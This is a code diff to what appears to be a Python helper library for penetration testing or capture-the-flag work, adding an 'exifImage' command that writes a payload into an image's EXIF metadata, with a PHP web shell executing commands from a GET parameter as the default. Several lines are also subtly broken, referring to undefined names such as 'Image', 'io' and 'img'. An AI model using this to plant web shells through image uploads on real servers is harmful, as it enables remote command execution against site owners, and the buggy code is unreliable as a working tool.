@@ -2,7 +2,8 @@ import random
 import socket
 import netifaces as ni
 import sys
-from pwn import *
+import exif
+import PIL
 
 def getAddress(interface="tun0"):
     if not interface in ni.interfaces():
@@ -71,6 +72,7 @@ class Stack:
         return addr
 
 def setRegisters(elf, registers):
+    from pwn import ROP
     rop = ROP(elf)
     for t in rop.setRegisters(registers):
         value = t[0]
@@ -96,6 +98,43 @@ def pad(x, n):
         x  += (n-(len(x)%n))*b"\x00"
     return x
 
+def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):
+
+    if _in is None:
+        _in = PIL.Image.new(Image.RGB, (10,10), (255,255,255))
+
+    if isinstance(_in, str):
+        _in = exif.Image(open(_in, "rb"))
+    elif isinstance(_in, PIL.Image):
+        bytes = io.BytesIO()
+        img.save(bytes)
+        _in = exif.Image(bytes)
+    elif not isinstance(_in, exif.Image):
+        print("Invalid input. Either give an Image or a path to an image.")
+        return
+
+    if exif_tag is None:
+        exif_tag = "image_description"
+    else:
+        valid_tags = dir(_in)
+
+        if exif_tag not in valid_tags:
+            print("Invalid exif-tag. Choose one of the following:")
+            print(", ".join(valid_tags))
+            return
+
+    _in[exif_tag] = payload
+    if _out is None:
+        sys.stdout.write(_in.get_file())
+        sys.stdout.flush()
+    elif isinstance(_out, str):
+        with open(_out, "wb") as f:
+            f.write(_in.get_file())
+    elif hasattr(_out, "write"):
+        _out.write(_in.get_file())
+    else:
+        print("Invalid output argument.")
+
 if __name__ == "__main__":
     bin = sys.argv[0]
     if len(sys.argv) < 2:
@@ -116,3 +155,20 @@ if __name__ == "__main__":
             print(pad(sys.argv[2].encode(), n))
         else:
             print("Usage: %s pad <str> [n=8]" % bin)
+    elif command == "exifImage":
+        if len(sys.argv) < 4:
+            print("Usage: %s exifImage <file> <payload> [tag]" % bin)
+        else:
+            _in = sys.argv[2]
+            payload = sys.argv[3]
+            if payload == "-":
+                payload = sys.stdin.readlines()
+
+            tag = None if len(sys.argv) < 5 else sys.argv[4]
+            _out = _in.split(".")
+            if len(_out) == 1:
+                _out = _in + "_exif"
+            else:
+                _out = ".".join(_out[0:-1]) + "_exif." + _out[-1]
+
+            exifImage(payload, _in, _out, tag)
